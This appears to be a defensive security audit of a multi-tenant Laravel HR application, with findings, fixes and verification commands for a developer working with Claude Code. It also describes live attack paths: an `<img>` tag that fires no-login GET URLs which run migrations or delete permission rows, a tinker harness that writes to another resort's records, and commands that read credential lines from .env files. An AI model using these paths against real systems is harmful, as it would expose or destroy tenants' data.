# SECURITY AUDIT — MASTER ISSUE LIST

> **Audience:** Ankit, working through this file with Claude Code.
> **Audited branch:** `upgrade/php85-laravel13` (the live Laravel 13 / PHP 8.3+ branch), at commit `448586d6c`.
> **Scope:** tenant isolation (cross-resort data access), data leaks, exposed secrets/files, frontend (XSS, uploads), auth/session/token hardening.
> **How this file was produced:** read-only research. No code was changed while writing it. Every finding below was traced in the code, not just grep-matched, unless it is explicitly marked `LIKELY` (i.e. strong evidence, still needs a live reproduction).
>
> This file grows stage by stage. Stages marked `PENDING AUDIT` haven't been researched yet. Don't invent issues for them.

---

## 0. INSTRUCTIONS FOR CLAUDE CODE (read before touching anything)

You are fixing security issues in a multi-tenant HR system (one resort = one `resort_id`). A careless "fix" can take production down or lock a resort out of its own data. Follow these rules exactly.

### 0.1 Working rules

1. **Read `CLAUDE.md` in the repo root first.** Its "Hard invariants" section applies to every fix here (migrations only, `StorageHelper` only, `resort_id` scoping, duplicate query paths per view).
2. **Work one issue ID at a time**, in the order of the Status Board (§1). Do not batch several issues into one change unless the issue text says to.
3. **Stay inside the issue's scope.** If you notice a different problem while fixing one, add it to §9 "Found while fixing" at the bottom of this file. Don't fix it in the same change.
4. **Steps marked `HUMAN` cannot be done by you** (rotating passwords at a provider, changing server config, checking the live site). Stop at those steps, tell Ankit exactly what to do, and wait for him to confirm before continuing.
5. **Never print, paste, or commit a secret value** (passwords, keys, tokens). When you need to compare or confirm a secret, compare lengths or hashes (`sha256sum`), never the value.
6. **One commit per issue ID**, message format: `security(<ISSUE-ID>): <short description>`.

### 0.2 Verification gates — MANDATORY

Every issue has a **VERIFY** block. An issue is **not done** until every command in its VERIFY block has been run and its output matches the "expected" line.

- You must **paste the actual command output** into your reply to Ankit for each VERIFY step. "I checked and it's fine" is not acceptable.
- If any VERIFY step fails or gives unexpected output: **the issue stays OPEN.** Diagnose, fix, and re-run the **whole** VERIFY block from the top.
- Once VERIFY passes, update that issue's row in §1 to `FIXED — <commit hash> — verified <date>`. Never mark a row `FIXED` without a commit hash.
- **After every 3 issues, run the REGRESSION GATE (§0.3)** before starting the next issue.

### 0.3 Regression gate (run after every 3 fixed issues, and at the very end)

```bash
# 1. Every PHP file you touched parses
git diff --name-only <commit-before-you-started>..HEAD -- '*.php' | xargs -r -n1 php -l

# 2. App boots and routes compile
php artisan route:list > /dev/null && echo "ROUTES OK"
php artisan config:cache && php artisan config:clear && echo "CONFIG OK"

# 3. Nothing outside the fixed issues changed
git diff --stat <commit-before-you-started>..HEAD
```
Expected: no parse errors, `ROUTES OK`, `CONFIG OK`, and the diff stat lists **only** files named in the issues you fixed. If an unexpected file appears, explain why or revert it.

### 0.4 Final gate (after the last issue in a stage)

Re-read this whole stage and, for each issue, re-run its VERIFY block one more time on the final state of the branch (a later fix can undo an earlier one). Report a table: `Issue ID | VERIFY re-run result | commit`.

### 0.5 Cross-tenant test harness (used by every tenant-isolation VERIFY from Stage 2 on)

A tenant-isolation fix is proven only when a user from **resort A** tries to act on a record belonging to **resort B** and **nothing in B changes**. Code inspection alone doesn't count. Run it in `php artisan tinker` against a DB with at least two resorts, **always inside a transaction that is rolled back**:

```php
DB::beginTransaction();
try {
    // 1. Log in as a portal user of resort A (pick any active one).
    $userA = \App\Models\ResortAdmin::whereNotNull('resort_id')->where('status', 'Active')->first(); // adjust status column if different
    auth()->guard('resort-admin')->setUser($userA);

    // 2. Pick a record that belongs to a DIFFERENT resort.
    $foreign = \App\Models\GrivanceSubmissionModel::where('resort_id', '!=', $userA->resort_id)->first();
    $before  = $foreign->fresh()->getAttributes();

    // 3. Build the request exactly as the browser would send it.
    $req = \Illuminate\Http\Request::create('/', 'POST', [/* fields from the issue */]);
    app()->instance('request', $req);

    // 4. Resolve the controller AFTER setUser (constructors read the logged-in user).
    $ctrl = app(\App\Http\Controllers\Resorts\GrievanceAndDisciplinery\GrivanceController::class);
    try { $res = $ctrl->METHOD($req); echo 'HTTP ' . (method_exists($res, 'getStatusCode') ? $res->getStatusCode() : 'view') . PHP_EOL; }
    catch (\Symfony\Component\HttpKernel\Exception\HttpException $e) { echo 'HTTP ' . $e->getStatusCode() . PHP_EOL; }

    // 5. Prove the foreign record did not change.
    $diff = array_diff_assoc($foreign->fresh()->getAttributes(), $before);
    echo empty($diff) ? "FOREIGN RECORD UNCHANGED\n" : 'CHANGED: ' . json_encode($diff) . PHP_EOL;
} finally {
    DB::rollBack();
}
```
**Pass condition for every cross-tenant VERIFY:** the response is `403`/`404` (or a JSON `success:false`) **and** the output says `FOREIGN RECORD UNCHANGED`. For delete endpoints, check `Model::find($foreign->id)` still returns the row. Also run the **same-resort** case (a record in A's own resort) to prove the fix didn't break the normal path. It must still succeed.

**Before-fix proof is required:** run the harness once **before** changing the code and paste the output that shows the leak (`CHANGED: …`). Then fix, re-run, and paste the passing output. A fix with no "before" proof doesn't count as verified.

---

## 1. STATUS BOARD

Severity scale: **CRITICAL** = exploitable now from the internet, or exposes all tenants · **HIGH** = one tenant's data exposed/changed by another, or a serious weakening · **MEDIUM** = needs extra conditions · **LOW** = hygiene.

| ID | Stage | Severity | Title | Status |
|---|---|---|---|---|
| S1-01 | 1 | CRITICAL | `public/info.php` exposes `phpinfo()` to the internet | OPEN |
| S1-02 | 1 | CRITICAL | `public/adminer.php` — full database admin tool reachable from the internet | OPEN |
| S1-03 | 1 | CRITICAL | `.env.staging` committed with real secrets (APP_KEY, DB, mail) | OPEN |
| S1-04 | 1 | HIGH | TLS certificate verification disabled for Wasabi / S3 / Pusher | OPEN |
| S1-05 | 1 | LOW | Stray `public/Kernel.php` copy of the HTTP kernel | OPEN |
| S1-06 | 1 | LOW | Guessable Pusher credential fallbacks in `config/broadcasting.php` | OPEN |
| S1-07 | 1 | LOW | Developer's real name/email in public import template | OPEN |
| S1-08 | 1 | CRITICAL | Public no-login URLs run database migrations, delete permission pages, clear caches, blast notifications | OPEN |
| S2-01 | 2 | HIGH | Investigation actions (assign committee, GM decision) can change another resort's grievance | OPEN |
| S2-02 | 2 | HIGH | "Request witness statement" works on another resort's grievance and notifies its witnesses | OPEN |
| S2-03 | 2 | HIGH | Grievance settings: 7 deletes + 2 edits work across resorts; no permission checks at all | OPEN |
| S2-04 | 2 | HIGH | Stored XSS — employee-written grievance text runs as code in HR's browser | OPEN |
| S2-05 | 2 | HIGH | Confidential grievant's identity leaks (History & Logs, push notification, file folder) | OPEN |
| S2-06 | 2 | HIGH | No role checks — any portal user can run committee / GM / HR / appeal-decision actions | OPEN |
| S2-07 | 2 | HIGH | "Secure" file encryption key read with `env()` — likely empty in production (all modules) | OPEN |
| S2-08 | 2 | MEDIUM | Investigation files of different grievances overwrite each other; web uploads have no file-type check | OPEN |
| S2-09 | 2 | MEDIUM | Grievant's app shows witness statements — decided: hide statements, keep committee notes for now | OPEN |
| S2-10 | 2 | LOW | Grievance numbers are one global sequence across all resorts | OPEN |
| S2-11 | 2 | LOW | Mobile witness-statement lookup not scoped (safe today, defence in depth) | OPEN |
| X-01 | cross-cutting | HIGH | Portal permission check allows every route not listed in `module_pages` (~91% of routes) — decided: extend the Permission module | OPEN |
| X-02 | cross-cutting | HIGH | Mobile app: 5 endpoints let a user act on / view **any** employee (other resorts or colleagues) by changing an ID | OPEN |
| X-03 | cross-cutting | MEDIUM | Super-admin "log in as resort user": any admin-panel account can use it, no audit trail, ends in a broken route | DEFERRED — owner to address before production go-live |
| S3-01 | 3 | CRITICAL | Live support chat runs on public channels — anyone can read every resort's support chats | OPEN |
| S3-02 | 3 | CRITICAL (LIKELY) | Support reply attachments: any file type saved into the web root (possible code execution) | OPEN |
| S3-03 | 3 | HIGH | Stored XSS in the support ticket email thread (super-admin view + resort view) | OPEN |
| S3-04 | 3 | HIGH | Stored XSS in live support chat renderers (super-admin + resort) | OPEN |
| S3-05 | 3 | HIGH | Chat sender identity (id, type, name, photo) is taken from the browser — messages can be faked | OPEN |
| S3-06 | 3 | MEDIUM | Support reply sends email to any address the user types, with the user's text | OPEN |
| S3-07 | 3 | LOW | Upload type gaps (SVG on tickets, no type check on chat) + raw name column in admin list | OPEN |
| S4-01 | 4 | HIGH | People who leave or are deactivated keep full mobile access (tokens never revoked, no status check) | OPEN |
| S4-02 | 4 | HIGH | Login status checks are wrong: `Terminated`/`Resigned`/`Suspended` can log in; admin "inactive" check never matches; deactivated resorts not blocked on mobile | OPEN |
| S4-03 | 4 | MEDIUM | Changing your password logs out only the current phone — other devices stay logged in | OPEN |
| S4-04 | 4 | MEDIUM | Mobile tokens last one year (Passport default) — decided: 90 days | OPEN |
| S5-01 | 5 | LOW | CORS config is dormant but misleading — one wrong edit would open the API to every website | OPEN |
| P-01 | 6 · Payroll | HIGH | Anyone with a portal login can see every salary and run/change payroll — decided: HR + Finance only | OPEN |
| P-02 | 6 · Payroll | HIGH | Payroll figures are taken from the browser and can be changed after approval | OPEN |
| P-03 | 6 · Payroll | MEDIUM | Mobile payslip PDFs saved with guessable names in one shared folder, never deleted | OPEN |
| P-04 | 6 · Payroll | LOW | Payroll import files kept forever on local disk; one unscoped deductions read | OPEN |
| W-01 | 6 · Manning & Budget | HIGH | Mobile app: any employee can read **another resort's** budget costs and org structure by changing `resort_id` | OPEN |
| W-02 | 6 · Manning & Budget | HIGH | Anyone with a portal login can **approve** a department budget, or all budgets for the year — decided: GM only | OPEN |
| W-03 | 6 · Manning & Budget | HIGH | Salary-level budget data (every employee's current + proposed salary) readable and editable by any portal user — decided: HR/Finance full, GM view+approve, HOD own dept | OPEN |
| W-04 | 6 · Manning & Budget | MEDIUM | A HOD can submit or overwrite **another department's** manning budget | OPEN |
| W-05 | 6 · Manning & Budget | LOW | Records from other resorts accepted as references (cost items, parent division/department/section, employee) | OPEN |
| W-06 | 6 · Manning & Budget | LOW | Budget/occupancy import files kept forever on local disk | OPEN |
| T-01 | 6 · Talent Acquisition | CRITICAL (LIKELY) | **Public, no-login** draft upload saves any file into the public web folder and tells the uploader where (possible code execution) | OPEN |
| T-02 | 6 · Talent Acquisition | HIGH | Stored XSS: text typed by **anonymous applicants** runs as code in HR's browser (5 places) + HTML injected into interviewer emails | OPEN |
| T-03 | 6 · Talent Acquisition | HIGH | Public applicant uploads not type-checked (CV, passport, other documents, SVG photos; video endpoint validation switched off) | OPEN |
| T-04 | 6 · Talent Acquisition | HIGH | Cross-resort writes: edit another resort's interview assessment form; pull another resort's applicant into your interviews | OPEN |
| T-05 | 6 · Talent Acquisition | HIGH | Any portal user can download all applicant documents (passports), delete applicants, send offers/contracts, set salaries — decided: HR full, GM approvals, HOD own dept, interviewers assigned only | OPEN |
| T-06 | 6 · Talent Acquisition | MEDIUM | Public forms have no rate limit / bot check; expired application links still work; submissions not tied to a valid open link | OPEN |
| T-07 | 6 · Talent Acquisition | LOW | CV-extraction AI URL read with `env()`; public "remove video" deletes row #1; two smaller raw outputs | OPEN |
| V-01 | 6 · Visa | HIGH | Mobile app: any employee can download **every colleague's** documents (passports) | OPEN |
| V-02 | 6 · Visa | HIGH | Any portal user can open expat passport/visa/work-permit data and run visa payments, deposits and wallet transfers — decided: HR full, Finance money + read, GM read-only | OPEN |
| V-03 | 6 · Visa | MEDIUM | Payment requests accept employees of other resorts | OPEN |
| V-04 | 6 · Visa | MEDIUM | Upload gaps: bulk documents not type-checked, SVG allowed, AI helpers forward any file | OPEN |
| V-05 | 6 · Visa | MEDIUM | Passports and visas are sent to the AI extraction service — confirm where it runs and that it's encrypted | HUMAN CHECK |
| V-06 | 6 · Visa | LOW | Small items: unused unscoped lookup, leftover debug function, raw receipt number, import file kept | OPEN |
| — | 6 · next modules | — | People/Employee → Disciplinary → Leave & Island Pass → … | PENDING AUDIT |

---

## 2. STAGE 1 — Exposed files & committed secrets

**Why this stage is first:** these can be exploited today by anyone on the internet who knows or guesses the URL, with no login, and they expose **every resort at once**, not just one tenant.

**Key facts established during the audit:**
- `public/` is the web root. Any `.php` file in it runs when its URL is requested.
- Only `public/index.php` should be a PHP file in `public/`. Right now there are four: `index.php`, `info.php`, `adminer.php`, `Kernel.php`.
- All three stray files and `.env.staging` arrived in commit `9f9cfdbfa` (2026-08-15). The clone is shallow, so older history couldn't be checked. **Assume the secrets have been in git history since the repo was created and treat them as compromised.**
- Nothing in the application code, config, or build scripts references `info.php`, `adminer.php`, or `.env.staging` (checked; the only hit is a comment in `app/Helpers/Common.php:8709`). Removing them can't break the app.

---

### S1-01 · CRITICAL · `public/info.php` exposes `phpinfo()`

**Where:** `public/info.php` (entire file is `<?php phpinfo(); ?>`).

**What an attacker gets:** opening `https://<your-domain>/info.php` in a browser shows the full PHP/server configuration, often including **environment variables** (DB credentials, Wasabi keys, OpenRouter key, mail password), server paths, PHP version and enabled extensions. That's everything needed to plan the next attack. No login required.

**Fix:**
1. `git rm public/info.php`
2. Don't replace it with anything. If you need PHP info for debugging, run `php -i` over SSH.

**`HUMAN` step (Ankit):** after deploy, delete the file from **every** server that has this code (production, staging, the old `projects.spaculus.live` host). A git deploy that only pulls may leave untracked copies behind.

**VERIFY:**
```bash
git ls-files public/info.php
```
Expected: *(no output)*
```bash
# HUMAN runs against every live host after deploy:
curl -s -o /dev/null -w '%{http_code}\n' https://<prod-domain>/info.php
```
Expected: `404` (anything else, and especially `200`, means it's still exposed).

---

### S1-02 · CRITICAL · `public/adminer.php` — database admin tool on the internet

**Where:** `public/adminer.php` (476 KB, Adminer — a single-file phpMyAdmin alternative).

**What an attacker gets:** a login page that connects **straight to the database**, bypassing the application and all its `resort_id` checks. Combined with S1-03 (the DB password is in git), anyone with repo access, or anyone the repo leaks to, may be able to log in and read or change **every resort's data**: salaries, passports, visas, grievances, everything. Even without the password, it's a brute-force target. Older Adminer versions also have publicly known vulnerabilities (e.g. server-side request forgery and file reading).

**Fix:**
1. `git rm public/adminer.php`
2. Don't move it elsewhere in the repo. For DB access, use an SSH tunnel (`ssh -L 3306:127.0.0.1:3306 user@server`) plus a desktop client (TablePlus / DBeaver / MySQL Workbench).

**`HUMAN` step (Ankit):**
- Delete the file from every server, same as S1-01.
- Check the web server access logs for any past requests to `/adminer.php`. If there are hits from IPs that aren't the team's, treat it as a **possible breach** and escalate. Don't just delete the file and move on.
  ```bash
  sudo grep -h "adminer.php" /var/log/nginx/access.log* /var/log/apache2/access.log* 2>/dev/null | awk '{print $1}' | sort | uniq -c | sort -rn
  # (zgrep for .gz rotated logs)
  ```

**VERIFY:**
```bash
git ls-files public/adminer.php
```
Expected: *(no output)*
```bash
# HUMAN, every live host:
curl -s -o /dev/null -w '%{http_code}\n' https://<prod-domain>/adminer.php
```
Expected: `404`

---

### S1-03 · CRITICAL · `.env.staging` committed with real secrets

**Where:** `.env.staging` (repo root, tracked in git; last changed in commit `3decf65bb`, 2026-09-21).

**What's in it (values deliberately not reproduced here):**

| Key | Assessment |
|---|---|
| `APP_KEY` | Real Laravel key (`base64:` format). |
| `DB_USERNAME` / `DB_PASSWORD` | Real-looking, not a placeholder. DB name `buvdb`, host `127.0.0.1`. |
| `MAIL_USERNAME` / `MAIL_PASSWORD` | `smtp.gmail.com`; the password has the exact shape of a **Google App Password** (16 lowercase letters). Anyone with it can **send email as that account** (phishing that looks official). |
| `REDIS_PASSWORD` | `null` — no secret. |
| `APP_ENV=production` | Mislabelled: `APP_URL` points at `projects.spaculus.live`, the old third-party staging host. |

**Why it matters:**
- Everyone who has ever had repo access (developers, contractors, CI services, any laptop that cloned it) has these values. **Deleting the file doesn't remove it from git history.**
- `APP_KEY` encrypts each resort's SMTP password in the DB (`app/Models/ResortSmtpConfig.php:36-44`, `Crypt::encryptString`). **If production uses the same `APP_KEY`**, anyone holding the repo plus a copy of the DB can decrypt every resort's mail password.
- `.gitignore` ignores `.env`, `.env.backup`, `.env.production` — but **not** `.env.staging`, and not any other `.env.*` names.

**Fix — code part (Claude Code):**
1. `git rm --cached .env.staging` (keep a local copy only if Ankit needs it; never re-commit it).
2. In `.gitignore`, replace the individual `.env*` lines with a pattern that ignores every env file except the example:
   ```gitignore
   .env
   .env.*
   !.env.example
   ```
3. Check `.env.example` holds **placeholders only** (it currently has short dummy values; confirm none are real).

**Fix — `HUMAN` part (Ankit). Do these in order; this is the part that actually removes the risk:**
1. **Find out whether production reuses any of these values.** On the prod server, compare hashes rather than values:
   ```bash
   # run on prod box and on a machine with the repo; compare the hashes, never the values
   grep -E '^(APP_KEY|DB_PASSWORD|MAIL_PASSWORD)=' .env | sha256sum   # prod .env
   grep -E '^(APP_KEY|DB_PASSWORD|MAIL_PASSWORD)=' .env.staging | sha256sum
   # or per key: grep '^APP_KEY=' .env | sha256sum
   ```
2. **Revoke the Gmail App Password** in the Google account (Security → App passwords) and create a new one. Put the new one **only** in the server's `.env`.
3. **Change the MySQL password** for that DB user on every server where it's used. Update the server `.env`. Never commit it.
4. **`APP_KEY` — only if production shares the staging key** (step 1). Rotating it has side effects: all users get logged out, and **every resort's stored SMTP password becomes unreadable** (`getPasswordAttribute` → `Crypt::decryptString` throws). Safe procedure:
   - a. Before rotating, export the decrypted SMTP passwords with a one-off script run in `php artisan tinker` (keep them in memory or a secure temp file, never in git).
   - b. Set the new `APP_KEY` (`php artisan key:generate --show`, paste into the prod `.env` by hand).
   - c. Re-save each `ResortSmtpConfig` password so it's encrypted with the new key.
   - d. Alternative: Laravel 13 supports `APP_PREVIOUS_KEYS` for gradual rotation, but `config/app.php` currently has **no `previous_keys` entry** (only `'key' => env('APP_KEY')` at line 123), so that entry would have to be added first.
   - If production does **not** share the key, rotating isn't required. Just make sure the new production server gets its own freshly generated key.
5. **Optional, a team decision:** purge `.env.staging` from git history (`git filter-repo --path .env.staging --invert-paths`). This rewrites history and needs a force-push plus every developer re-cloning. **Rotation (steps 2-4) is mandatory; purging history is not a substitute for it.**

**VERIFY (Claude Code):**
```bash
git ls-files | grep -E '^\.env' 
```
Expected: exactly one line: `.env.example`
```bash
git check-ignore -v .env.staging .env.production .env.local
```
Expected: all three reported as ignored by the `.env.*` rule.
```bash
git check-ignore .env.example; echo "exit=$?"
```
Expected: `exit=1` and nothing else printed (`.env.example` itself is **not** ignored).

**VERIFY (`HUMAN` — Ankit confirms in writing):**
- [ ] Gmail App Password revoked and replaced
- [ ] DB password changed on every server that used it
- [ ] `APP_KEY` decision recorded: "prod shares staging key: yes/no → rotated: yes/not needed"
- [ ] If rotated: send a test email from one resort's SMTP settings and confirm it still sends (proves the SMTP passwords were re-encrypted)

---

### S1-04 · HIGH · TLS certificate verification disabled (Wasabi, S3, Pusher)

**Where:**
- `config/filesystems.php:69-71` — `s3` disk: `'http' => ['verify' => false]`
- `config/filesystems.php:83-85` — `wasabi` disk: `'http' => ['verify' => false]`
- `config/broadcasting.php:45-46` — Pusher: `CURLOPT_SSL_VERIFYHOST => 0`, `CURLOPT_SSL_VERIFYPEER => 0`

**Why it matters:** production runs `STORAGE_DRIVER=wasabi`, so **every uploaded file** — passports, visas, contracts, payslips, grievance attachments — plus the Wasabi access key travel between the app server and Wasabi over a connection whose certificate is **never checked**. Anyone who can intercept that network path (a compromised network hop, a hostile DNS answer) can pose as Wasabi, read or alter files, and capture the storage credentials. The comment above the S3 block ("Tell the AWS SDK exactly which CA root certificates to use") suggests this was added to get past a missing-CA error on some server, not as a deliberate choice.

**Fix:**
1. Remove the three `verify => false` / `CURLOPT_SSL_VERIFY* => 0` settings (delete the `'http' => [...]` blocks and the two `CURLOPT` lines).
2. If a server then fails with a certificate error, fix the **server**, not the code: `HUMAN` installs/updates the CA bundle (`sudo apt install --reinstall ca-certificates` / `update-ca-certificates`) and makes sure `php.ini` `curl.cainfo` / `openssl.cafile` point to it. If a custom CA path is really needed, use `'verify' => env('STORAGE_CA_BUNDLE', true)`, never `false`.
3. **Test on staging before production.** If the certificate chain is broken on the prod box, this change will stop uploads there.

**VERIFY:**
```bash
grep -rnE "'verify'\s*=>\s*false|CURLOPT_SSL_VERIFY(HOST|PEER)\s*=>\s*(0|false)" config app
```
Expected: *(no output)*
```bash
# Round-trip a file through the real storage disk (run on staging, then prod):
php artisan tinker --execute="
\$p='healthcheck/tls-'.uniqid().'.txt';
\App\Helpers\StorageHelper::put(\$p,'ok');
echo \App\Helpers\StorageHelper::get(\$p) === 'ok' ? 'STORAGE TLS OK' : 'MISMATCH';
\App\Helpers\StorageHelper::delete(\$p);
"
```
Expected: `STORAGE TLS OK`. (`StorageHelper::put/get/delete` exist at `app/Helpers/StorageHelper.php:48/53/63`. Run this on a box where the default disk is `wasabi`, or it proves nothing about Wasabi.)

---

### S1-05 · LOW · Stray `public/Kernel.php`

**Where:** `public/Kernel.php`, an indented copy of `app/Http/Kernel.php` sitting in the web root.

**Why it matters:** it's executable from the web (`/Kernel.php`). Today it only declares a class, so running it does nothing harmful, but it reveals the app's middleware setup, and it's the kind of stray file that turns into a real problem when someone edits it later. Rule: `public/` holds `index.php` and static assets only.

**Fix:** `git rm public/Kernel.php`. Confirm nothing references it:
```bash
grep -rn "public/Kernel.php" --exclude-dir=vendor --exclude-dir=node_modules .
```
Expected: *(no output)* before removing.

**VERIFY (covers S1-01, S1-02, S1-05 together):**
```bash
git ls-files public | grep -E '\.php$' | grep -v '/vendor/'
```
Expected: exactly one line: `public/index.php`

---

### S1-06 · LOW · Guessable Pusher credential fallbacks in config

**Where:** `config/broadcasting.php:35-37` — `env('PUSHER_APP_KEY', 'local')`, `env('PUSHER_APP_SECRET', 'your-secret')`, `env('PUSHER_APP_ID', 'app-id')`.

**What it is:** these are placeholder values, not leaked real credentials. The risk is the silent fallback: if production's `.env` is ever missing `PUSHER_APP_SECRET`, the app quietly runs with the world-known secret `your-secret`, and anyone can then **sign fake real-time events** against a self-hosted websocket server. Secrets should fail loudly when missing, not fall back to a guessable default.

**Fix:** remove the fallbacks for `key`, `secret`, `app_id` (make them `env('PUSHER_APP_KEY')` etc. with no second argument). Leave the non-secret fallbacks (`port`, host/scheme) alone. `HUMAN`: confirm the prod `.env` defines `PUSHER_APP_KEY`, `PUSHER_APP_SECRET`, `PUSHER_APP_ID` **before** deploying this, or real-time features will stop.

**VERIFY:**
```bash
grep -nE "env\('PUSHER_APP_(KEY|SECRET|ID)',\s*'" config/broadcasting.php
```
Expected: *(no output)*
```bash
# HUMAN, on prod, after deploy:
php artisan tinker --execute="echo strlen((string) config('broadcasting.connections.pusher.secret')) > 0 ? 'PUSHER SECRET SET' : 'MISSING';"
```
Expected: `PUSHER SECRET SET`

---

### S1-07 · LOW · Developer's real details in a public download

**Where:** `public/resorts_assets/demofiles/Employee.xlsx`, the bulk employee-import template, publicly downloadable. Its sample row contains a real developer name and a real `@spaculus.com` email address, and the template has a `Password` column.

**Why it matters:** minor, but it's exactly the kind of thing an international client's security reviewer flags ("personal data in public assets"). It leaks a named person's work email (a phishing target) and hints that bulk import accepts plaintext passwords.

**Fix:** replace the sample row with obvious fake data (`Jane Doe`, `jane.doe@example.com`, password `ChangeMe123!` or leave it blank). Don't change the column headers; the import code depends on them. This is a data file only, not code.

**VERIFY:**
```bash
unzip -p public/resorts_assets/demofiles/Employee.xlsx xl/sharedStrings.xml | grep -oiE '[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}'
```
Expected: only `@example.com` addresses.

---

### S1-08 · CRITICAL · Public no-login URLs that change the database and the system

*(Found during the Stage 3 audit and placed in Stage 1 because, like S1-01/02, it's reachable by anyone on the internet with no login. **Fix this together with S1-01 and S1-02.**)*

**Where:** `routes/web.php`, loaded by `RouteServiceProvider::mapWebRoutes()` (`app/Providers/RouteServiceProvider.php:121-126`) with **only** the `web` middleware: no `auth`, no IP restriction. They're all plain `GET` requests, so they can even be triggered by an `<img src="https://<domain>/qb">` tag in any email or web page someone opens.

| URL | Line | What it does when anyone opens it | Impact |
|---|---|---|---|
| `/migrate` | 36-41 | `Artisan::call('migrate', ['--force' => true])` | Runs any pending migrations on **production** immediately, at an attacker-chosen moment (e.g. mid-deploy, before code is ready). The code comment says "Only allow from a secure IP or with auth!", but nothing enforces it. |
| `/qb` (defined twice) | 42-50 | `ModulePages::where('module_id', 17)->delete()` | **Deletes a whole module's menu and permission pages.** Because of X-01, deleted pages become "unlisted", and unlisted routes are **allowed for everyone**. So this URL both breaks the menu and **switches off permission checks** for that module. |
| `migrate/rollback` | 78-81 | `Artisan::call('migrate:rollback')` | **Undoes the last migration batch, which can drop tables and columns (data loss).** Without `--force`, Laravel normally refuses when `APP_ENV=production`, but it **runs on any host where `APP_ENV` isn't `production`** (staging, test boxes). Don't rely on that setting as the protection. |
| `/clear` | 72-75 | `Artisan::call('optimize:clear')` | Wipes config, route and view caches on demand. Repeated calls = slowdown or denial of service. It also makes the app read `.env` live, which changes behaviour (see S2-07). |
| `/survey-change-status`, `/onboarding-new-emp-hire-notification`, `/calendar-push-notification` | 83-99 | Run scheduled notification jobs on demand | Anyone can make **every employee** receive push notifications again and again (spam, and a loss of trust in the app). |
| `/marquee` | 58-60 | `File::get('C:\Users\Spaculus\Downloads\krishika.txt')` | A developer's local Windows path. It errors on the server, and reveals a developer's machine path and name. |

**Also:** `routes/front_route.php` contains `/migrate`, `/migrate/rollback`, `/passport/keys`, `/passport/install` and `/clear`. It's **not loaded today** (no `require`/`group` of it anywhere), but it's one careless line away from being live, and `/passport/keys` would **log out every mobile user**. Delete it.

**Fix:**
1. Delete every route in the table above from `routes/web.php` (lines 36-50, 58-60, 72-99), and delete `routes/front_route.php`.
2. Keep the other routes in `web.php` (`/broadcasting/auth`, `/meeting/respond/{token}`, `/`).
3. The scheduled jobs (`links:*`) should run from the Laravel scheduler / cron, not from URLs. `HUMAN` confirms they're in `app/Console` / `routes/console.php` scheduling, so removing the URLs doesn't stop them running.
4. Migrations and cache clears are deploy steps: `php artisan migrate --force` and `php artisan optimize` over SSH / in the deploy script. `HUMAN` confirms the deploy process doesn't call these URLs.
5. `HUMAN`: check web-server access logs for past hits to these paths (same command as S1-02, with `migrate|qb|rollback|clear|survey-change-status|onboarding-new-emp|calendar-push`). Hits from unknown IPs → investigate. **Check the `module_pages` rows for module 17 exist** (if `/qb` was ever called on prod, that module's permission pages are gone).

**VERIFY:**
```bash
grep -nE "Artisan::call|ModulePages::|File::get\('C:" routes/web.php
```
Expected: *(no output)*
```bash
ls routes/front_route.php 2>&1
```
Expected: `No such file or directory`
```bash
# HUMAN, every live host, after deploy — each must be 404:
for p in migrate qb migrate/rollback clear marquee survey-change-status onboarding-new-emp-hire-notification calendar-push-notification; do
  printf '%s %s\n' "$(curl -s -o /dev/null -w '%{http_code}' https://<prod-domain>/$p)" "$p"; done
```
Expected: `404` on every line.

---

### Stage 1 — checked and found clean

So Claude Code doesn't spend time re-auditing these:
- No private keys, certificates, Passport `oauth-*.key` files, or Firebase/Google service-account JSON are tracked in git.
- No `.sql`, `.zip`, `.bak`, `.log` or other dump/backup files are tracked under `public/`.
- No hardcoded OpenRouter / OpenAI / AWS / GitHub / Slack tokens were found in `app/`, `config/`, `routes/`, `resources/`, `database/`, or the app's own JS under `public/`.
- `public/resorts_assets/Applicants/…/user-2.svg` and `public/images/cards/*.svg` are static icons, not uploaded applicant data.
- The Google Maps embed key in `database/seeders/PreviousWeekAttendanceSeeder.php:139` is a browser-side embed key (these are public by design). `HUMAN`: make sure that key is restricted to your domains in Google Cloud Console.

---

## 3. STAGE 2 — Grievance module

**Scope audited:** every grievance route in `routes/resort_route.php` (≈60) and `routes/api.php` (10), across:
- `app/Http/Controllers/Resorts/GrievanceAndDisciplinery/GrivanceController.php` (web: list, create, investigation, identity, statements, history, delete, PDF)
- `app/Http/Controllers/Resorts/GrievanceAndDisciplinery/GrievanceAppealController.php` (web: appeals)
- `app/Http/Controllers/Resorts/GrievanceAndDisciplinery/ConfigurationController.php` (grievance settings methods only)
- `app/Http/Controllers/API/GrievanceController.php` (mobile)
- Views in `resources/views/resorts/GrievanceAndDisciplinery/grivance/` and `.../HistoryAndLogs/`

**Not in this stage:** the Disciplinary half of the module (`DisciplinaryController.php`, disciplinary config methods). That comes in the module sweep.

**Two facts that shape every fix in this stage:**
1. **Grievance IDs are guessable.** Record IDs are sequential integers, and the "encoding" in URLs is plain `base64` (e.g. `MTIz` = `123`). Anyone can decode one and try the next number. Human-readable numbers (`GR-0001`, `GR-0002`…) are **one global sequence across all resorts** (S2-10). A `resort_id` check on the server is the only real protection.
2. **The portal's permission check lets through any route not listed in `module_pages`** (see X-01). Of about 60 grievance routes, **only 4 are listed** (`grivance.GrivanceIndex`, `config.index`, `Hrdashboard`, `Disciplinary.DisciplinaryIndex`). Every other grievance action is open to **any logged-in portal user of the resort**, whatever their role, unless the method checks permissions itself, and most don't.

**Correction to an earlier chat claim:** the committee **edit** branch (`InvestigationReportStore`, `flag=EditModeForCommittee`, `GrivanceController.php:526-710`) was described as able to change another resort's grievance. On the current branch that's **blocked, but only by accident**: the committee-membership check rejects assigned foreign grievances, and for unassigned ones the code crashes on a null investigation record before committing. It still gets the scoping fix in S2-01 because it's one refactor away from being exploitable, but it isn't a confirmed leak today.

---

### S2-01 · HIGH · Investigation actions can change another resort's grievance

**Where:** `GrivanceController::InvestigationReportStore()` — `GrivanceController.php:471-756`, one method with three branches picked by `$request->flag`:

| Branch | Lines | Lookup | Confirmed effect on a grievance from another resort |
|---|---|---|---|
| `flag=AssignToComittee` | 474-525 | `GrivanceSubmissionModel::where('id',$id)->update(...)` at **500** | **Committed.** Sets `Assigned=Yes`, `status=in_review` and `Committee_id` on the foreign grievance, and creates an investigation row pointing at it (499). The `assign_to` committee IDs are only checked to be integers, never that the committee belongs to this resort (481-482). |
